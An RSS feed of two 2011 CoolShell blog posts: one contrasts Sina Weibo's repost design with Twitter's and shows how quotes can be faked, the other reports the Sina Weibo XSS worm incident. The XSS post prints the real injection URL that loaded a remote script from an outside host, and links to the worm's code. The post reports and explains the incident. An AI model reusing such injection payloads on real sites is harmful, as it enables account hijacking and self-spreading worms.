@@ -1,0 +1,181 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Weibo | 酷 壳 - CoolShell</title>
+	<atom:link href="https://coolshell.cn/tag/weibo/feed" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Wed, 17 Aug 2011 03:39:49 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>国内微博和Twitter的最大不同</title>
+		<link>https://coolshell.cn/articles/5247.html</link>
+					<comments>https://coolshell.cn/articles/5247.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 17 Aug 2011 00:34:04 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[Sina]]></category>
+		<category><![CDATA[Twitter]]></category>
+		<category><![CDATA[Web]]></category>
+		<category><![CDATA[Weibo]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=5247</guid>
+
+					<description><![CDATA[<p>霍炬近两个月前写过一篇《microblogging和微博信息架构产品差距和影响》分析了国内微博和Twitter的差距，重点就是因为信息的平等性。我也一直在观察新...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/5247.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/5247.html">国内微博和Twitter的最大不同</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>霍炬近两个月前写过一篇《<a href="http://blog.devep.net/virushuo/2011/06/26/microblogging.html">microblogging和微博信息架构产品差距和影响</a>》分析了国内微博和Twitter的差距，重点就是因为信息的平等性。我也一直在观察新浪微博，以及新浪和Twitter的一些功能上的差别。发现了一些东西，想在这里和大家分享一下。我的见解达不到像霍炬那样的层次，作为一个技术人员，我只能在产品功能上做些分析。欢迎大家指正。</p>
+<h4>现实状况</h4>
+<p>国内的微博就是新浪，Sohu微博，腾讯微博，以及饭否。我们不难发现：</p>
+<ul>
+<li>搜狐的和腾讯的就是Copy新浪的。在Following和Followed上大家都有自己所谓的“创新”</li>
+<li>饭否是在Copy Twitter，这点太明显了，不过，抄在了表面，而且相当的怪。</li>
+</ul>
+<p>国内所有的这些以Twitter为蓝本干出来的这些东西，其和Twitter在核心功能上有这些差别：</p>
+<ul>
+<li>Twitter的Retweet一点信息都加不上，国内的微博的转发需要加上自己的评论，也就形自己的信息。</li>
+<li>Twitter的Reply只会有一个@原来的人，国内的Reply也很相似，只是勾上转发后就会把Reply的东西以“<strong>//@XXX</strong>”的方式成为自己的信息。</li>
+<li>饭否的做法比较怪，转发加原文（想做成新浪的样子），回复不加原文，只有@（Twitter）的样子，可见饭否的分裂。</li>
+</ul>
+<h4>SNS中的上下文</h4>
+<p>这段时间，我一直在想，新浪为什么要做成这样，为什么不做成Twitter那样，或者，为什么Twitter做成那样而不是新浪这样？从表面上看上去，<strong>新浪的“<span style="color: #800000;">回复+转发</span>”会带被回的信息，而Twitter的回复不带上下文，Twitter上一些我fo的人的话题完全看不懂，不像新浪的还能看到上文</strong>。</p>
+<p>老实说，在一开始，我还觉得新浪微博这种用法和技术上要比 Twitter 要强大，现在看来是我当时对Twitter并不熟悉。经过这段时间的观察。<strong>我恰恰发现新浪在转发和回复上都要带上原文其实是一件很没有技术含量的事</strong>。要说清这个事，请让我说一下评论和回复的事。</p>
+<p><span id="more-5247"></span></p>
+<ul>
+<li>我们网上讨论一个事的时候，你会发现，一个主题下的讨论会对回复的话题进行讨论而偏题，甚至会发散出多条讨论线各自发展。这种事会造成讨论的混乱。所以，上下文是关键。</li>
+<li>BBS和Wordpress可以使用“引用”或“回复”来让你的话题有上下文。新浪的博客和新闻评论里没有，只是网易的评论可以盖楼。所以新浪微博基本上采用的就是这样的方式。</li>
+</ul>
+<p>然而，Twitter则不是，Twitter的回复系统是不会像新浪那样加上“<strong>//@XXX</strong>”的东西的，如果你要看信息的上下文，你需要点击信息，在右边栏会出现其上下文列表。<strong>Twitter的这个功能可以让你很容易地找到一个信息链，而不受别的信息链的干扰，不像国内微博那样——多个信息链穿插成一锅粥让你无法阅读</strong>（饭否是抄Twitter抄的最像的，但是其没有实现这个功能）。</p>
+<h4>上下文造假</h4>
+<p>国内的所有微博都做不到这个事，我估计是因为技术不行。所以，为了加上上下文，他们只能做成今天你看到的这个样子。你也许会想和我争论，这样在阅读体验上更好。但是，如果你看过下面这个例子，你一定就不会这么想了。</p>
+<p>在新浪微博上，我们转发或是回复时，我们可以人为地加上这样的上下文（说白了，就是造假）：</p>
+<blockquote><p>//<a href="http://weibo.com/yaochen" target="_blank">@姚晨</a>：八顿也会C语言。//<a href="http://weibo.com/renzhiqiang" target="_blank">@任志强</a>：不是C++才牛吗？ //<a href="http://blog.sina.com.cn/lichengpeng" target="_blank">@李承鹏</a>：代表盲肠封你为程序员的脊梁。//<a href="http://weibo.com/1739928273" target="_blank">@苍井空</a>：还要爱吃空心菜的菜。 //<a href="http://weibo.com/kaifulee" target="_blank">@李开复</a>：成功的程序员的标志：1）用C语言，2）不用IE6，3）无需敏捷咨询师。</p></blockquote>
+<p>看到这个，你明白为什么Twitter要那样，而不是新浪这样了吧？！<strong>这就是差距，至少是产品经理的差距</strong>。我个人觉得还有技术上的差距。如果某人给你发来的一条手机短信你都搞不清楚是不是这个人说的，那会是多么恐怖的事。</p>
+<p><span style="color: #cc0000;"><strong>有人说，在Twitter上也可以造假，但是这需要用户自己去干，Twitter的系统并不会主动干这个。 Twitter的Retweet和Reply是可以区分用户行为和系统行为（就看你加不加原信息），而新浪微博则无法区系统行为和用户行为，这就是国内微博的软肋！</strong></span></p>
+<h4>其它</h4>
+<p>新浪的东西其实挺没创意的，<a title="微软用新浪来当反面教材" href="https://coolshell.cn/articles/3872.html" target="_blank">微软用新浪在当过反面教材</a>，某WEB设计师也用<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">新浪来当过反面教材</a>。不过，新浪微博还是很强大的，尤其是删贴和阻止信息传播上，经过观察，的确很强大。</p>
+<p><span style="color: #008000;">我把我这篇文章里的那个欺诈示例转到了我的微博（<a href="http://weibo.com/n/%E5%B7%A6%E8%80%B3%E6%9C%B5%E8%80%97%E5%AD%90"><span style="color: #008000;">@左耳朵耗子</span></a>）做了个测试。结果，在有这篇文章做提示的情况下，还是有些人相信了，还有些人骂我并把我取消关注和拉黑了。我真是服了，我故意造得这么假这么娱乐，结果还是有些人认真了。你说那些骗子看到这个情况岂不是开心之极啊。再次说明新浪微博的这种上下文的方式弊端！</span></p>
+<p>（<strong>转载请注明作者和出处</strong>）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-150x150.png" alt="新浪微博的XSS攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li><li ><a href="https://coolshell.cn/articles/22367.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-150x150.png" alt="聊聊 nostr 和 审查" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22367.html" class="wp_rp_title">聊聊 nostr 和 审查</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/12/1053-DHH-150x150.jpg" alt="DHH 谈混合移动应用开发" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_title">DHH 谈混合移动应用开发</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/5247.html">国内微博和Twitter的最大不同</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/5247.html/feed</wfw:commentRss>
+			<slash:comments>85</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>新浪微博的XSS攻击</title>
+		<link>https://coolshell.cn/articles/4914.html</link>
+					<comments>https://coolshell.cn/articles/4914.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 28 Jun 2011 15:10:18 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[业界新闻]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Sina]]></category>
+		<category><![CDATA[Weibo]]></category>
+		<category><![CDATA[XSS]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4914</guid>
+
+					<description><![CDATA[<p>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4914.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4914.html">新浪微博的XSS攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>今天晚上（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。</p>
+<p>事件的经过线索如下：</p>
+<ul>
+<li>20:14，开始有大量带V的认证用户中招转发蠕虫</li>
+<li>20:30，2kt.cn中的病毒页面无法访问</li>
+<li>20:32，新浪微博中hellosamy用户无法访问</li>
+<li>21:02，新浪漏洞修补完毕</li>
+</ul>
+<p style="text-align: center;">&nbsp;</p>
+<figure id="attachment_4915" aria-describedby="caption-attachment-4915" style="width: 583px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-4915 " title="新浪微博XSS事件" src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01.png" alt="新浪微博XSS事件" width="583" height="148" srcset="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01.png 729w, https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-300x76.png 300w, https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-604x153.png 604w" sizes="(max-width: 583px) 100vw, 583px" /><figcaption id="caption-attachment-4915" class="wp-caption-text">新浪微博XSS事件</figcaption></figure>
+<p style="text-align: left;">&nbsp;</p>
+<p style="text-align: left;">在这里，想和大家介绍一下XSS攻击，XSS攻击又叫跨站脚本式攻击，你Google一下可以搜到很多很多的文章。我在这里就简单地说一下。</p>
+<p style="text-align: left;"><span id="more-4914"></span></p>
+<p style="text-align: left;">首先，我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。这就是XSS攻击的最基本思路。</p>
+<p style="text-align: left;">再说一点，不一定是“记住你的用户名和密码”或是“自动登录”的方法，因为HTTP是无状态的协议，所以，几乎所有的网站都会在你的浏览器上设置cookie来记录状态，以便在其多个网页切换中检查你的登录状态。而现在的浏览器的运行方式是多页面或多窗口运行，也就是说，你在同一个父进程下开的多个页面或窗口里都可以无偿和共享使用你登录状态的。</p>
+<p style="text-align: left;">当然，你不必过于担心访问别的网站，在别的网站里的js代码会自动访问你的微博或是网银。因为浏览器的安全性让js只能访问自己所在网站的资源（你可以引入其它网站的js）。当然，这是浏览器对js做的检查，所以，浏览器并不一定会做这个检查，这就是为什么<a title="中国仍是IE6的重灾区" href="https://coolshell.cn/articles/3921.html" target="_blank">IE6是史上最不安全的浏览器</a>，没有之一。只要你没有在用IE6，应该没有这些问题。</p>
+<p style="text-align: left;">XSS攻击有两种方法，</p>
+<ul>
+<li>一种就像SQL Injection或CMD Injection攻击一样，我把一段脚本注入到服务器上，用户访问方法服务器的某个URL，这个URL就会把远端的js注入进来，这个js有可能自动进行很多操作。比如这次事件中的帮你发微博，帮你发站内消息等。注入有很多方法，比如：提交表单，更改URL参数，上传图片，设置签名，等等。</li>
+</ul>
+<ul>
+<li>另一类则是来来自外部的攻击，主要指的自己构造XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个跨站网页放在自己的服务器上，然后通过结合其它技术，如 社会工程学等，欺骗目标服务器的管理员打开。这一类攻击的威胁相对较低，至少ajax 要发起跨站调用是非常困难的（你可能需要hack浏览器）。</li>
+</ul>
+<p>这次新浪微博事件是第一种，其利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入了js脚本，其通过http://163.fm/PxZHoxn短链接服务，将链接指向：</p>
+<p style="text-align: left; padding-left: 30px;">http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=update</p>
+<p style="text-align: left;">注意，上面URL链接中的其实就是&lt;script src=//www.2kt.cn/images/t.js&gt;&lt;/script&gt;。</p>
+<p style="text-align: left;">攻击者并不一定是2kt.cn的人，因为.cn被国家严格管制（大家不知道coolshell.cn 的备案备了不知有多少次），所以，我个人觉得这个人不会愚蠢到用自己域名来做攻击服务器。</p>
+<h4 style="text-align: left;">其它</h4>
+<ul>
+<li>初步发现 Chrome 和 Safari 都没中招。IE、Firefox未能幸免。</li>
+<li>史上最著名的XSS攻击是Yahoo Mail 的<a href="http://en.wikipedia.org/wiki/Yamanner" target="_blank">Yamanner </a>蠕虫是一个著名的XSS 攻击实例。早期Yahoo Mail 系统可以执行到信件内的javascript 代码。并且Yahoo Mail 系统使用了Ajax技术，这样病毒javascript 可以的向Yahoo Mail 系统发起ajax 请求，从而得到用户的地址簿，并发送攻击代码给他人。</li>
+<li>为什么那个用户叫hellosamy，因为<a href="http://en.wikipedia.org/wiki/Samy_(XSS)" target="_blank">samy</a>是第一个XSS攻击性的蠕虫病毒，在MySpace上传播。</li>
+<li>关于攻击的代码在这里：<a href="https://coolshell.cn/wp-content/uploads/2011/06/06.28_sina_XSS.txt.zip">06.28_sina_XSS.txt</a> （编码风格还是很不错的）</li>
+</ul>
+<p style="text-align: left;">（全文完）</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="国内微博和Twitter的最大不同" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5247.html" class="wp_rp_title">国内微博和Twitter的最大不同</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li><li ><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg" alt="程序员疫苗：代码注入" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a></li><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4914.html">新浪微博的XSS攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4914.html/feed</wfw:commentRss>
+			<slash:comments>244</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
